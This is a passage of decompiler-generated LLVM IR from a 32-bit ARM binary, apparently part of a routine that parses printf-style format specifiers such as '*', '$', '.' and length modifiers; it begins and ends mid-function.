  %v1_11cb4 = inttoptr i32 %v0_11cf4 to i8*
  %v2_11cb4 = load i8, i8* %v1_11cb4, align 1
  %v3_11cb4 = zext i8 %v2_11cb4 to i32
  store i32 %v3_11cb4, i32* %r3.global-to-local, align 4
  %v7_11cb8 = icmp eq i8 %v2_11cb4, 42
  br i1 %v7_11cb8, label %dec_label_pc_11cc0, label %dec_label_pc_11d04

dec_label_pc_11cc0:                               ; preds = %dec_label_pc_11cb4
  %v0_11cc0 = load i32, i32* %sb.global-to-local, align 4
  %v2_11cc0 = icmp eq i32 %v0_11cc0, 0
  br i1 %v2_11cc0, label %dec_label_pc_11cf4, label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cc0
  %v1_11cc8 = inttoptr i32 %v1_11cf8 to i8*
  %v2_11cc8 = load i8, i8* %v1_11cc8, align 1
  %v3_11cc8 = zext i8 %v2_11cc8 to i32
  store i32 %v3_11cc8, i32* %r3.global-to-local, align 4
  %v7_11ccc = icmp eq i8 %v2_11cc8, 36
  br i1 %v7_11ccc, label %dec_label_pc_11cd4, label %dec_label_pc_11f7c

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cc8
  %v0_11cd4 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_11cd4, 1
  br i1 %tmp134, label %dec_label_pc_11f7c, label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cd4
  store i32 %v25_11ae8, i32* %r1.global-to-local, align 4
  %v0_11ce4 = load i32, i32* @lr, align 4
  %v3_11ce4 = mul i32 %v0_11ce4, -4
  %v4_11ce4 = add i32 %v3_11ce4, %v25_11ae8
  store i32 %v4_11ce4, i32* %r3.global-to-local, align 4
  %v1_11ce8 = add i32 %v1_11cf8, 1
  store i32 %v1_11ce8, i32* %r6.global-to-local, align 4
  %v2_11cec = add i32 %v4_11ce4, -24
  %v3_11cec = inttoptr i32 %v2_11cec to i32*
  store i32 %v0_11cd4, i32* %v3_11cec, align 4
  br label %dec_label_pc_11d00

dec_label_pc_11cf4:                               ; preds = %dec_label_pc_11cc0
  %v1_11cf4 = add i32 %v0_11cf4, 1
  store i32 %v1_11cf4, i32* %r3.global-to-local, align 4
  %v9_11cf8 = icmp eq i32 %v1_11cf4, %v1_11cf8
  br i1 %v9_11cf8, label %dec_label_pc_11d00, label %dec_label_pc_11f7c

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11cf4, %dec_label_pc_11cdc
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11cb4, %dec_label_pc_11d00
  %v0_11d04 = load i32, i32* @lr, align 4
  %v2_11d04 = icmp eq i32 %v0_11d04, 0
  br i1 %v2_11d04, label %dec_label_pc_11d0c, label %dec_label_pc_11b24

dec_label_pc_11d0c:                               ; preds = %dec_label_pc_11d04
  %v0_11d0c = load i32, i32* %r6.global-to-local, align 4
  %v1_11d0c = inttoptr i32 %v0_11d0c to i8*
  %v2_11d0c = load i8, i8* %v1_11d0c, align 1
  %v3_11d0c = zext i8 %v2_11d0c to i32
  store i32 %v3_11d0c, i32* %r3.global-to-local, align 4
  %v7_11d10 = icmp eq i8 %v2_11d0c, 46
  br i1 %v7_11d10, label %.thread22, label %dec_label_pc_11d24

.thread22:                                        ; preds = %dec_label_pc_11d0c
  %v2_11d14 = add i32 %v0_11d0c, 1
  store i32 %v2_11d14, i32* %r6.global-to-local, align 4
  %v1_11d18 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_11d18, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_11b8c

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11d0c
  %v0_11d24 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11d24, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11d2c

dec_label_pc_11d2c:                               ; preds = %dec_label_pc_11b24, %dec_label_pc_11d24
  %v0_11d34.pre = phi i32 [ %v0_11d0c, %dec_label_pc_11d24 ], [ %v0_11d34.pre.pre, %dec_label_pc_11b24 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_11d24 ], [ %v0_11b24, %dec_label_pc_11b24 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1ca3c.614 to i32), i32* %r1.global-to-local, align 4
  %v1_11d34 = inttoptr i32 %v0_11d34.pre to i8*
  br label %dec_label_pc_11d30

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d40, %dec_label_pc_11d2c
  %v0_11d40 = phi i32 [ %v1_11d40, %dec_label_pc_11d40 ], [ ptrtoint ([9 x i8]* @global_var_1ca3c.614 to i32), %dec_label_pc_11d2c ]
  %v1_11d30 = inttoptr i32 %v0_11d40 to i8*
  %v2_11d30 = load i8, i8* %v1_11d30, align 1
  %v3_11d30 = zext i8 %v2_11d30 to i32
  store i32 %v3_11d30, i32* %r2.global-to-local, align 4
  %v2_11d34 = load i8, i8* %v1_11d34, align 1
  %v3_11d34 = zext i8 %v2_11d34 to i32
  store i32 %v3_11d34, i32* %r3.global-to-local, align 4
  %v9_11d38 = icmp eq i8 %v2_11d34, %v2_11d30
  br i1 %v9_11d38, label %dec_label_pc_11b2c, label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %dec_label_pc_11d30
  %v1_11d40 = add i32 %v0_11d40, 1
  %v2_11d40 = inttoptr i32 %v1_11d40 to i8*
  %v3_11d40 = load i8, i8* %v2_11d40, align 1
  %v4_11d40 = zext i8 %v3_11d40 to i32
  store i32 %v4_11d40, i32* %r3.global-to-local, align 4
  store i32 %v1_11d40, i32* %r1.global-to-local, align 4
  %v2_11d44 = icmp eq i8 %v3_11d40, 0
  br i1 %v2_11d44, label %dec_label_pc_11d4c, label %dec_label_pc_11d30

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d40, %dec_label_pc_11b2c
  %v1_11d6c = phi i32 [ %v1_11b2c, %dec_label_pc_11b2c ], [ %v0_11d34.pre, %dec_label_pc_11d40 ]
  %v1_11d68 = phi i32 [ %v0_11d40, %dec_label_pc_11b2c ], [ %v1_11d40, %dec_label_pc_11d40 ]
  %v2_11d50 = sub i32 %v1_11d68, ptrtoint ([9 x i8]* @global_var_1ca3c.614 to i32)
  store i32 %v2_11d50, i32* %r3.global-to-local, align 4
  %v8_11d58 = icmp sgt i32 %v2_11d50, 1
  br i1 %v8_11d58, label %.thread25, label %dec_label_pc_11d5c

dec_label_pc_11d5c:                               ; preds = %dec_label_pc_11d4c
  %v1_11d5c = inttoptr i32 %v1_11d6c to i8*
  %v2_11d5c = load i8, i8* %v1_11d5c, align 1
  %v3_11d5c = zext i8 %v2_11d5c to i32
  store i32 %v3_11d5c, i32* %r2.global-to-local, align 4
  %v1_11d60 = inttoptr i32 %v1_11d68 to i8*
  %v2_11d60 = load i8, i8* %v1_11d60, align 1
  %v3_11d60 = zext i8 %v2_11d60 to i32
  store i32 %v3_11d60, i32* %r3.global-to-local, align 4
  %v9_11d64 = icmp eq i8 %v2_11d5c, %v2_11d60
  br i1 %v9_11d64, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_11d5c
  %v2_11d68 = add i32 %v1_11d68, 9
  store i32 %v2_11d68, i32* %r1.global-to-local, align 4
  %v2_11d6c = add i32 %v1_11d6c, 1
  store i32 %v2_11d6c, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11d5c, %dec_label_pc_11d4c, %bb135
  %v0_11d74 = phi i32 [ %v1_11d68, %dec_label_pc_11d5c ], [ %v1_11d68, %dec_label_pc_11d4c ], [ %v2_11d68, %bb135 ]
  %v0_11d70 = phi i32 [ %v1_11d6c, %dec_label_pc_11d5c ], [ %v1_11d6c, %dec_label_pc_11d4c ], [ %v2_11d6c, %bb135 ]
  %v1_11d70 = inttoptr i32 %v0_11d70 to i8*
  %v2_11d70 = load i8, i8* %v1_11d70, align 1
  %v3_11d70 = zext i8 %v2_11d70 to i32
  store i32 %v3_11d70, i32* %r2.global-to-local, align 4
  %v1_11d74 = add i32 %v0_11d74, 9
  %v2_11d74 = inttoptr i32 %v1_11d74 to i8*
  %v3_11d74 = load i8, i8* %v2_11d74, align 1
  %v4_11d74 = zext i8 %v3_11d74 to i32
  store i32 %v4_11d74, i32* %r3.global-to-local, align 4
  %v2_11d78 = icmp eq i8 %v2_11d70, 0
  %v3_11d7c = mul nuw nsw i32 %v4_11d74, 256
  store i32 %v3_11d7c, i32* @lr, align 4
  br i1 %v2_11d78, label %dec_label_pc_11f7c, label %dec_label_pc_11d84

dec_label_pc_11d84:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_1ca7c.616 to i32), i32* %ip.global-to-local, align 4
  %v3_11d88 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_11d88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d8c

dec_label_pc_11d8c:                               ; preds = %dec_label_pc_11e10, %dec_label_pc_11d84
  %v1_11d9c = phi i32 [ %v1_11e10, %dec_label_pc_11e10 ], [ ptrtoint ([21 x i8]* @global_var_1ca7c.616 to i32), %dec_label_pc_11d84 ]
  %v1_11d8c = inttoptr i32 %v1_11d9c to i8*
  %v2_11d8c = load i8, i8* %v1_11d8c, align 1
  %v3_11d8c = zext i8 %v2_11d8c to i32
  store i32 %v3_11d8c, i32* %r3.global-to-local, align 4
  %v9_11d90 = icmp eq i8 %v2_11d8c, %v2_11d70
  br i1 %v9_11d90, label %dec_label_pc_11d98, label %dec_label_pc_11e10

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d8c
  store i32 ptrtoint ([21 x i8]* @global_var_1ca7c.616 to i32), i32* %r3.global-to-local, align 4
  %v2_11d9c = sub i32 %v1_11d9c, ptrtoint ([21 x i8]* @global_var_1ca7c.616 to i32)
  store i32 %v2_11d9c, i32* %r2.global-to-local, align 4
  %v7_11da4 = icmp slt i32 %v2_11d9c, 18
  br i1 %v7_11da4, label %bb137, label %dec_label_pc_11da8

dec_label_pc_11da8:                               ; preds = %dec_label_pc_11d98
  %v1_11da8 = and i32 %v3_11d7c, 1024
  %v2_11da8 = icmp eq i32 %v1_11da8, 0
  br i1 %v2_11da8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_11da8
  %v2_11dac = add i32 %v2_11d9c, -2
  store i32 %v2_11dac, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_11d98, %dec_label_pc_11da8, %bb136
  %v0_11db0 = phi i32 [ %v2_11d9c, %dec_label_pc_11d98 ], [ %v2_11d9c, %dec_label_pc_11da8 ], [ %v2_11dac, %bb136 ]
  %v1_11db0 = load i32, i32* %r7.global-to-local, align 4
  %v2_11db0 = add i32 %v1_11db0, 32
  %v3_11db0 = inttoptr i32 %v2_11db0 to i32*
  store i32 %v0_11db0, i32* %v3_11db0, align 4
  store i32 ptrtoint (i32* @global_var_1ca6f.618 to i32), i32* %r1.global-to-local, align 4
  %v0_11dbc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %dec_label_pc_11db8, %bb137
  %v0_11db8 = phi i32 [ %v1_11db8, %dec_label_pc_11db8 ], [ ptrtoint (i32* @global_var_1ca6f.618 to i32), %bb137 ]
  %v1_11db8 = add i32 %v0_11db8, 1
  %v2_11db8 = inttoptr i32 %v1_11db8 to i8*
  %v3_11db8 = load i8, i8* %v2_11db8, align 1
  %v4_11db8 = zext i8 %v3_11db8 to i32
  store i32 %v4_11db8, i32* %r3.global-to-local, align 4
  store i32 %v1_11db8, i32* %r1.global-to-local, align 4
  %v8_11dc0 = icmp sgt i32 %v0_11dbc.pre, %v4_11db8
  br i1 %v8_11dc0, label %dec_label_pc_11db8, label %dec_label_pc_11dc4

dec_label_pc_11dc4:                               ; preds = %dec_label_pc_11db8
  store i32 ptrtoint (i32* @global_var_1ca60.622 to i32), i32* %r0.global-to-local, align 4
  %v2_11dcc = sub i32 %v1_11db8, ptrtoint (i32* @global_var_1ca70.620 to i32)
  %v2_11dd0 = mul i32 %v2_11dcc, 2
  store i32 %v2_11dd0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ca50.624 to i32), i32* %ip.global-to-local, align 4
  %v2_11dd8 = add i32 %v2_11dd0, ptrtoint (i32* @global_var_1ca60.622 to i32)
  store i32 %v2_11dd8, i32* %r2.global-to-local, align 4
  %v1_11ddc = add i32 %v2_11dd0, add (i32 ptrtoint (i32* @global_var_1ca60.622 to i32), i32 1)
  %v2_11ddc = inttoptr i32 %v1_11ddc to i8*
  %v3_11ddc = load i8, i8* %v2_11ddc, align 1
  %v4_11ddc = zext i8 %v3_11ddc to i32
  store i32 %v4_11ddc, i32* %r1.global-to-local, align 4
  %v2_11de0 = add i32 %v2_11dd0, ptrtoint (i32* @global_var_1ca50.624 to i32)
  store i32 %v2_11de0, i32* %r2.global-to-local, align 4
  %v3_11de4 = inttoptr i32 %v2_11dd8 to i8*
  %v4_11de4 = load i8, i8* %v3_11de4, align 2
  %v6_11de4 = zext i8 %v4_11de4 to i32
  store i32 %v6_11de4, i32* %r0.global-to-local, align 4
  %v1_11de8 = add i32 %v2_11dd0, add (i32 ptrtoint (i32* @global_var_1ca50.624 to i32), i32 1)
  %v2_11de8 = inttoptr i32 %v1_11de8 to i8*
  %v3_11de8 = load i8, i8* %v2_11de8, align 1
  %v4_11de8 = zext i8 %v3_11de8 to i32
  store i32 %v4_11de8, i32* %r2.global-to-local, align 4
  %v3_11dec = inttoptr i32 %v2_11de0 to i8*
  %v4_11dec = load i8, i8* %v3_11dec, align 2
  %v6_11dec = zext i8 %v4_11dec to i32
  %v3_11df0 = mul nuw i32 %v4_11ddc, 16777216
  store i32 %v3_11df0, i32* %r1.global-to-local, align 4
  %v4_11df4 = sdiv i32 %v3_11df0, 65536
  %v5_11df4 = or i32 %v6_11de4, %v4_11df4
  %v3_11df8 = mul nuw i32 %v4_11de8, 16777216
  store i32 %v3_11df8, i32* %r2.global-to-local, align 4
  %v4_11dfc = sdiv i32 %v3_11df8, 65536
  %v5_11dfc = or i32 %v6_11dec, %v4_11dfc
  store i32 %v5_11dfc, i32* %r3.global-to-local, align 4
  %v0_11e00 = load i32, i32* @lr, align 4
  %v2_11e00 = or i32 %v5_11df4, %v0_11e00
  store i32 ptrtoint ([21 x i8]* @global_var_1ca7c.616 to i32), i32* %ip.global-to-local, align 4
  %v2_11e08 = and i32 %v2_11e00, %v5_11dfc
  store i32 %v2_11e08, i32* %r0.global-to-local, align 4
  %v0_11e24.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11e1c

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11d8c
  %v1_11e10 = add i32 %v1_11d9c, 1
  %v2_11e10 = inttoptr i32 %v1_11e10 to i8*
  %v3_11e10 = load i8, i8* %v2_11e10, align 1
  %v4_11e10 = zext i8 %v3_11e10 to i32
  store i32 %v4_11e10, i32* %r3.global-to-local, align 4
  store i32 %v1_11e10, i32* %ip.global-to-local, align 4
  %v2_11e14 = icmp eq i8 %v3_11e10, 0
  br i1 %v2_11e14, label %dec_label_pc_11e1c, label %dec_label_pc_11d8c

dec_label_pc_11e1c:                               ; preds = %dec_label_pc_11e10, %dec_label_pc_11dc4
  %v0_11e28 = phi i32 [ %v0_11e00, %dec_label_pc_11dc4 ], [ %v3_11d7c, %dec_label_pc_11e10 ]
  %v0_11e24 = phi i32 [ %v0_11e24.pre, %dec_label_pc_11dc4 ], [ %v0_11d70, %dec_label_pc_11e10 ]
  %v0_11e1c = phi i32 [ %v2_11e08, %dec_label_pc_11dc4 ], [ %v3_11d88, %dec_label_pc_11e10 ]
  store i32 %v0_11e1c, i32* %stack_var_-36, align 4
  %v0_11e20 = load i32, i32* @r4, align 4
  %v1_11e20 = and i32 %v0_11e20, 4
  %v1_11e24 = inttoptr i32 %v0_11e24 to i8*
  %v2_11e24 = load i8, i8* %v1_11e24, align 1
  %v3_11e24 = zext i8 %v2_11e24 to i32
  store i32 %v3_11e24, i32* %r1.global-to-local, align 4
  %v1_11e28 = and i32 %v0_11e28, 3840
  %v1_11e2c = and i32 %v0_11e20, -5
  %v2_11e30 = or i32 %v1_11e2c, %v1_11e28
  store i32 %v2_11e30, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_11e20, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_11e40 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e40 = add i32 %v1_11e40, 12
  %v3_11e40 = inttoptr i32 %v2_11e40 to i32*
  store i32 %v3_11e24, i32* %v3_11e40, align 4
  %v0_11e44 = load i32, i32* %r7.global-to-local, align 4
  %v1_11e44 = add i32 %v0_11e44, 4
  %v2_11e44 = inttoptr i32 %v1_11e44 to i32*
  %v3_11e44 = load i32, i32* @r5, align 4
  store i32 %v3_11e44, i32* %v2_11e44, align 4
  %v4_11e44 = add i32 %v0_11e44, 8
  %v5_11e44 = inttoptr i32 %v4_11e44 to i32*
  %v6_11e44 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_11e44, i32* %v5_11e44, align 4
  %v0_11e48 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e48 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e48 = add i32 %v1_11e48, 20
  %v3_11e48 = inttoptr i32 %v2_11e48 to i32*
  store i32 %v0_11e48, i32* %v3_11e48, align 4
  %v0_11e4c = load i32, i32* %r2.global-to-local, align 4
  %v1_11e4c = load i32, i32* %r7.global-to-local, align 4
  %v2_11e4c = add i32 %v1_11e4c, 16
  %v3_11e4c = inttoptr i32 %v2_11e4c to i32*
  store i32 %v0_11e4c, i32* %v3_11e4c, align 4
  %v0_11e50 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e50 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e50 = add i32 %v1_11e50, 28
  %v3_11e50 = inttoptr i32 %v2_11e50 to i32*
  store i32 %v0_11e50, i32* %v3_11e50, align 4
  %v0_11e54 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e54 = inttoptr i32 %v0_11e54 to i8*
  %v2_11e54 = load i8, i8* %v1_11e54, align 1
  %v3_11e54 = zext i8 %v2_11e54 to i32
  store i32 %v3_11e54, i32* %r2.global-to-local, align 4
  %v2_11e58 = icmp eq i8 %v2_11e54, 0
  br i1 %v2_11e58, label %dec_label_pc_11e60, label %dec_label_pc_11e78

dec_label_pc_11e60:                               ; preds = %dec_label_pc_11e1c
  %v0_11e60 = load i32, i32* %r6.global-to-local, align 4
  %v1_11e60 = inttoptr i32 %v0_11e60 to i8*
  %v2_11e60 = load i8, i8* %v1_11e60, align 1
  %v3_11e60 = zext i8 %v2_11e60 to i32
  store i32 %v3_11e60, i32* %r3.global-to-local, align 4
  %v7_11e64 = icmp eq i8 %v2_11e60, 109
  br i1 %v7_11e64, label %dec_label_pc_11e6c, label %dec_label_pc_11f7c

dec_label_pc_11e6c:                               ; preds = %dec_label_pc_11e60
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_11e70 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e70 = add i32 %v1_11e70, 32
  %v3_11e70 = inttoptr i32 %v2_11e70 to i32*
  store i32 20, i32* %v3_11e70, align 4
  %v0_11e74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e74 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e74 = add i32 %v1_11e74, 28
  %v3_11e74 = inttoptr i32 %v2_11e74 to i32*
  store i32 %v0_11e74, i32* %v3_11e74, align 4
  br label %dec_label_pc_11e78

dec_label_pc_11e78:                               ; preds = %dec_label_pc_11e1c, %dec_label_pc_11e6c
  %v0_11e78 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_11e78, 1
  br i1 %tmp141, label %dec_label_pc_11f30, label %dec_label_pc_11e80

dec_label_pc_11e80:                               ; preds = %dec_label_pc_11e78
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11e84

dec_label_pc_11e84:                               ; preds = %dec_label_pc_11f18, %dec_label_pc_11e80
  %v8_11ea0 = phi i32 [ 0, %dec_label_pc_11e80 ], [ %v1_11f1c, %dec_label_pc_11f18 ]
  %v7_11e88 = icmp sgt i32 %v8_11ea0, 2
  br i1 %v7_11e88, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_11e84
  store i32 %v25_11ae8, i32* %r2.global-to-local, align 4
  %v12_11e8c = mul i32 %v8_11ea0, 4
  %v13_11e8c = add i32 %v12_11e8c, %v25_11ae8
  store i32 %v13_11e8c, i32* %r3.global-to-local, align 4
  %v9_11e90 = add i32 %v13_11e8c, -24
  %v10_11e90 = inttoptr i32 %v9_11e90 to i32*
  %v11_11e90 = load i32, i32* %v10_11e90, align 4
  store i32 %v11_11e90, i32* %r2.global-to-local, align 4
  %v9_11e94 = load i32, i32* %r7.global-to-local, align 4
  %v10_11e94 = add i32 %v9_11e94, %v8_11ea0
  store i32 %v10_11e94, i32* %r3.global-to-local, align 4
  %v9_11e9c = trunc i32 %v11_11e90 to i8
  %v11_11e9c = add i32 %v10_11e94, 36
  %v12_11e9c = inttoptr i32 %v11_11e9c to i8*
  store i8 %v9_11e9c, i8* %v12_11e9c, align 1
  %v8_11ea4 = load i32, i32* %r3.global-to-local, align 4
  %v9_11ea4 = add i32 %v8_11ea4, 36
  %v10_11ea4 = inttoptr i32 %v9_11ea4 to i8*
  %v11_11ea4 = load i8, i8* %v10_11ea4, align 1
  %v12_11ea4 = zext i8 %v11_11ea4 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_11e84
  %v10_11ea0 = add i32 %v8_11ea0, %stack_var_-48.3
  store i32 %v10_11ea0, i32* %r3.global-to-local, align 4
  %v9_11ea8 = add i32 %v10_11ea0, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_11ecc = phi i32 [ %v12_11ea4, %bb142 ], [ %v9_11ea8, %bb143 ]
  store i32 %v0_11ecc, i32* @r2, align 4
  %v1_11eac = load i32, i32* %sb.global-to-local, align 4
  %v2_11eac = sub i32 %v0_11ecc, %v1_11eac
  %v4_11eac = xor i32 %v1_11eac, %v0_11ecc
  %v5_11eac = xor i32 %v2_11eac, %v0_11ecc
  %v6_11eac = and i32 %v5_11eac, %v4_11eac
  %v7_11eac = icmp slt i32 %v6_11eac, 0
  %v8_11eac = icmp slt i32 %v2_11eac, 0
  %v9_11eac = icmp eq i32 %v0_11ecc, %v1_11eac
  %v3_11eb0 = xor i1 %v8_11eac, %v7_11eac
  %v4_11eb0 = or i1 %v9_11eac, %v3_11eb0
  br i1 %v4_11eb0, label %dec_label_pc_11ec0, label %dec_label_pc_11eb4

dec_label_pc_11eb4:                               ; preds = %bb144
  %v1_11eb4 = add i32 %v0_11ecc, -9
  %v3_11eb4 = sub i32 8, %v0_11ecc
  %v4_11eb4 = and i32 %v3_11eb4, %v0_11ecc
  %v5_11eb4 = icmp slt i32 %v4_11eb4, 0
  %v6_11eb4 = icmp slt i32 %v1_11eb4, 0
  %v7_11eb4 = icmp eq i32 %v0_11ecc, 9
  %v3_11eb8 = xor i1 %v6_11eb4, %v5_11eb4
  %v4_11eb8 = or i1 %v7_11eb4, %v3_11eb8
  br i1 %v4_11eb8, label %dec_label_pc_11ebc, label %dec_label_pc_11f7c

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11eb4
  store i32 %v0_11ecc, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11ec0

dec_label_pc_11ec0:                               ; preds = %bb144, %dec_label_pc_11ebc
  store i32 %v25_11ae8, i32* %ip.global-to-local, align 4
  %v1_11ec4 = load i32, i32* %r8.global-to-local, align 4
  %v4_11ec4 = mul i32 %v1_11ec4, 4
  %v5_11ec4 = add i32 %v4_11ec4, %v25_11ae8
  store i32 %v5_11ec4, i32* %r3.global-to-local, align 4
  %v1_11ec8 = add i32 %v5_11ec4, -12
  %v2_11ec8 = inttoptr i32 %v1_11ec8 to i32*
  %v3_11ec8 = load i32, i32* %v2_11ec8, align 4
  store i32 %v3_11ec8, i32* %r5.global-to-local, align 4
  %v1_11ecc = add i32 %v0_11ecc, -1
  store i32 %v1_11ecc, i32* %sl.global-to-local, align 4
  %v0_11ed0 = load i32, i32* %r7.global-to-local, align 4
  %v4_11ed0 = mul i32 %v1_11ecc, 4
  %v5_11ed0 = add i32 %v0_11ed0, %v4_11ed0
  store i32 %v5_11ed0, i32* %r3.global-to-local, align 4
  %v7_11ed4 = icmp eq i32 %v3_11ec8, 8
  %v1_11ed8 = add i32 %v5_11ed0, 40
  %v2_11ed8 = inttoptr i32 %v1_11ed8 to i32*
  %v3_11ed8 = load i32, i32* %v2_11ed8, align 4
  store i32 %v3_11ed8, i32* @r0, align 4
  br i1 %v7_11ed4, label %dec_label_pc_11f18, label %dec_label_pc_11ee0

dec_label_pc_11ee0:                               ; preds = %dec_label_pc_11ec0
  %v9_11ee0 = icmp eq i32 %v3_11ed8, %v3_11ec8
  br i1 %v9_11ee0, label %dec_label_pc_11f04, label %bb145

bb145:                                            ; preds = %dec_label_pc_11ee0
  %v8_11ee4 = icmp eq i32 %v3_11ed8, 8
  br i1 %v8_11ee4, label %dec_label_pc_11f04, label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %bb145
  %v0_11eec = call i32 @_promoted_size()
  %v0_11ef4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11ef4, i32* @r0, align 4
  %v0_11ef8 = call i32 @_promoted_size()
  store i32 %v0_11ef8, i32* %r0.global-to-local, align 4
  %v8_11f00 = icmp sgt i32 %v0_11eec, %v0_11ef8
  br i1 %v8_11f00, label %dec_label_pc_11f18, label %dec_label_pc_11eec.dec_label_pc_11f04_crit_edge

dec_label_pc_11eec.dec_label_pc_11f04_crit_edge:  ; preds = %dec_label_pc_11eec
  %v1_11f08.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11f10.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_11f10.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11f04

dec_label_pc_11f04:                               ; preds = %dec_label_pc_11eec.dec_label_pc_11f04_crit_edge, %dec_label_pc_11ee0, %bb145
  %v1_11f10 = phi i32 [ %v1_11f10.pre, %dec_label_pc_11eec.dec_label_pc_11f04_crit_edge ], [ %v1_11ecc, %dec_label_pc_11ee0 ], [ %v1_11ecc, %bb145 ]
  %v0_11f10 = phi i32 [ %v0_11f10.pre, %dec_label_pc_11eec.dec_label_pc_11f04_crit_edge ], [ %v0_11ed0, %dec_label_pc_11ee0 ], [ %v0_11ed0, %bb145 ]
  %v1_11f08 = phi i32 [ %v1_11f08.pre, %dec_label_pc_11eec.dec_label_pc_11f04_crit_edge ], [ %v1_11ec4, %dec_label_pc_11ee0 ], [ %v1_11ec4, %bb145 ]
  store i32 %v25_11ae8, i32* %r1.global-to-local, align 4
  %v4_11f08 = mul i32 %v1_11f08, 4
  %v5_11f08 = add i32 %v4_11f08, %v25_11ae8
  store i32 %v5_11f08, i32* %r3.global-to-local, align 4
  %v1_11f0c = add i32 %v5_11f08, -12
  %v2_11f0c = inttoptr i32 %v1_11f0c to i32*
  %v3_11f0c = load i32, i32* %v2_11f0c, align 4
  store i32 %v3_11f0c, i32* @r2, align 4
  %v4_11f10 = mul i32 %v1_11f10, 4
  %v5_11f10 = add i32 %v4_11f10, %v0_11f10
  store i32 %v5_11f10, i32* %r3.global-to-local, align 4
  %v2_11f14 = add i32 %v5_11f10, 40
  %v3_11f14 = inttoptr i32 %v2_11f14 to i32*
  store i32 %v3_11f0c, i32* %v3_11f14, align 4
  br label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11eec, %dec_label_pc_11ec0, %dec_label_pc_11f04
  %v0_11f18 = load i32, i32* %r7.global-to-local, align 4
  %v1_11f18 = add i32 %v0_11f18, 28
  %v2_11f18 = inttoptr i32 %v1_11f18 to i32*
  %v3_11f18 = load i32, i32* %v2_11f18, align 4
  %v0_11f1c = load i32, i32* %r8.global-to-local, align 4
  %v1_11f1c = add i32 %v0_11f1c, 1
  store i32 %v1_11f1c, i32* %r8.global-to-local, align 4
  %v1_11f20 = add i32 %v3_11f18, 2
  store i32 %v1_11f20, i32* %r3.global-to-local, align 4
  %v6_11f28 = icmp slt i32 %v1_11f1c, %v1_11f20
  br i1 %v6_11f28, label %dec_label_pc_11e84, label %dec_label_pc_11f48

dec_label_pc_11f30:                               ; preds = %dec_label_pc_11e78
  %v0_11f30 = load i32, i32* %r7.global-to-local, align 4
  %v1_11f30 = add i32 %v0_11f30, 28
  %v2_11f30 = inttoptr i32 %v1_11f30 to i32*
  %v3_11f30 = load i32, i32* %v2_11f30, align 4
  store i32 %v3_11f30, i32* %r2.global-to-local, align 4
  %v0_11f34 = load i32, i32* %r0.global-to-local, align 4
  %v1_11f34 = trunc i32 %v0_11f34 to i8
  %v3_11f34 = add i32 %v0_11f30, 38
  %v4_11f34 = inttoptr i32 %v3_11f34 to i8*
  store i8 %v1_11f34, i8* %v4_11f34, align 1
  %v0_11f38 = load i32, i32* %r2.global-to-local, align 4
  %v3_11f38 = mul i32 %v0_11f38, 4
  store i32 %v3_11f38, i32* @r2, align 4
  %v0_11f3c = load i32, i32* %r7.global-to-local, align 4
  %v1_11f3c = add i32 %v0_11f3c, 40
